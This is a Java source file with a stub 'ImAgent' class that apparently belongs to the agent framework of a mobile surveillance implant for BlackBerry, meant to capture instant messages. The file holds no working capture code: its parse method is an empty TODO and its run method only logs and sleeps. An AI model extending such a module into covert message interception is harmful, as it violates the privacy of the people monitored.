package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ImAgent extends Agent
{
	static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE );
	public ImAgent( int AgentStatus)
	{
		super(Agent.AGENT_IM, AgentStatus, true);

	}

	protected ImAgent(int AgentStatus, byte[] confParams)
	{
		this(AgentStatus);
		Parse(confParams);
	}

	protected boolean Parse(byte[] confParameters)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public void AgentRun()
	{
		debug.trace("run");
		this.SleepUntilStopped();

	}

}